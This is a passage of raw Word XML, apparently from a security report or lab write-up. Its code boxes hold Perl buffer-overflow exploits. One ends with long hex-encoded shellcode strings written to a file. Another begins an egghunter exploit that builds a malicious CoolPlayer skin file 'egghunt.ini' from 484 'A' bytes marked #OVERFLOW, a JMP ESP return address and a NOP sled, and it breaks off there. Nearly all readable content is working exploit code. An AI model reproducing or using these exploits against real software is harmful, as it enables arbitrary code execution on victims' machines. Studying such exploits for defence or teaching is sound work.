                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x44\x4c\x4b\x45\x51\x4e\x30\x4d\x59\x51\x54\x47\x54\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7366DEED" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x44\x51\x4b\x51\x4b\x43\x51\x56\x39\x51\x4a\x56\x31\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4C831F36" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4f\x4b\x50\x50\x58\x51\x4f\x51\x4a\x4c\x4b\x52\x32\x5a" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5D5130DC" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4b\x4d\x56\x51\x4d\x52\x48\x47\x43\x50\x32\x43\x30\x45" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0ECC4463" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x50\x45\x38\x54\x37\x54\x33\x47\x42\x51\x4f\x51\x44\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4D6842FC" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x48\x50\x4c\x52\x57\x51\x36\x43\x37\x4b\x4f\x58\x55\x4f" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="33DEA027" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x48\x4c\x50\x45\x51\x45\x50\x43\x30\x56\x49\x49\x54\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7EB2D381" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x54\x56\x30\x43\x58\x51\x39\x4d\x50\x52\x4b\x45\x50\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2D68E5D0" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4f\x4e\x35\x56\x30\x50\x50\x50\x50\x56\x30\x47\x30\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2C453069" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x50\x51\x50\x56\x30\x52\x48\x4b\x5a\x54\x4f\x49\x4f\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="755EE96F" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x50\x4b\x4f\x58\x55\x4d\x59\x4f\x37\x45\x38\x49\x50\x49" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="552E377E" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x38\x45\x50\x49\x58\x52\x48\x45\x52\x45\x50\x52\x31\x51" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6913B377" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4c\x4d\x59\x4b\x56\x52\x4a\x54\x50\x50\x56\x56\x37\x45" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="33D8BC24" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x38\x4c\x59\x49\x35\x52\x54\x43\x51\x4b\x4f\x58\x55\x45" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1CB677BD" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x38\x43\x53\x52\x4d\x45\x34\x43\x30\x4b\x39\x4d\x33\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1F1C4C27" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x37\x50\x57\x51\x47\x56\x51\x4c\x36\x43\x5a\x52\x32\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1BA23A61" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x39\x51\x46\x4d\x32\x4b\x4d\x43\x56\x4f\x37\x47\x34\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="39A65648" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x44\x47\x4c\x45\x51\x45\x51\x4c\x4d\x51\x54\x56\x44\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3D48E717" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x30\x4f\x36\x43\x30\x51\x54\x51\x44\x50\x50\x51\x46\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="30D63C84" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x56\x51\x46\x47\x36\x56\x36\x50\x4e\x56\x36\x51\x46\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="25DC61A8" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x33\x51\x46\x52\x48\x43\x49\x58\x4c\x47\x4f\x4b\x36\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="129B2B5F" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4f\x4e\x35\x4d\x59\x4b\x50\x50\x4e\x56\x36\x50\x46\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="65DB9DF9" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4f\x50\x30\x45\x38\x54\x48\x4c\x47\x45\x4d\x45\x30\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="354837B8" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4f\x49\x45\x4f\x4b\x4c\x30\x4f\x45\x49\x32\x50\x56\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2E8E54A7" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x48\x4e\x46\x4d\x45\x4f\x4d\x4d\x4d\x4b\x4f\x49\x45\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="25525719" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4c\x45\x56\x43\x4c\x45\x5a\x4b\x30\x4b\x4b\x4d\x30\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="62E4180C" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x55\x45\x55\x4f\x4b\x51\x57\x45\x43\x43\x42\x52\x4f\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="637B6683" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4a\x45\x50\x50\x53\x4b\x4f\x49\x45\x41\x41";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1018ADD9" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="1DD213C8" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>open($FILE,"&gt;$file1");</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1F4DB11B" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>print $FILE $buffer;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="461BBF0A" w14:textId="02901D4C" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>close($FILE);</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="7210B47B" w14:textId="72E625BE" w:rsidR="00B05CEB" w:rsidRPr="00B05CEB" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30BBA47C" w14:textId="53252130" w:rsidR="00B05CEB" w:rsidRDefault="00B05CEB">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50AAD52B" w14:textId="2DDE015D" w:rsidR="00B05CEB" w:rsidRDefault="00B05CEB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15751E42" w14:textId="1F333F7D" w:rsidR="004D7F6C" w:rsidRDefault="00CF75AD" w:rsidP="00CF75AD">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="67" w:name="_Toc103326493"/>
      <w:r w:rsidRPr="004D7F6C">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251706368" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="76ABDB0C" wp14:editId="448BF920">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-581660</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>225425</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4772025" cy="7972425"/>
                <wp:effectExtent l="0" t="0" r="28575"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2025" cy="7972425"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="57583F0A" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$file1 = "egghunt.ini"; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6F7750DA" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>nPlaylistSkin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t xml:space="preserve">="; </w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4F659C74" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>$buffer .= "A" x 484;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00E72F21">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>#OVERFLOW</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="082FDF4B" w14:textId="165DB3C9" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>$buffer .= pack('V', 0x7C86467B);</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00E72F21">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00E72F21">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>#JMP ESP</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2F95E8DC" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x90" x 20;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
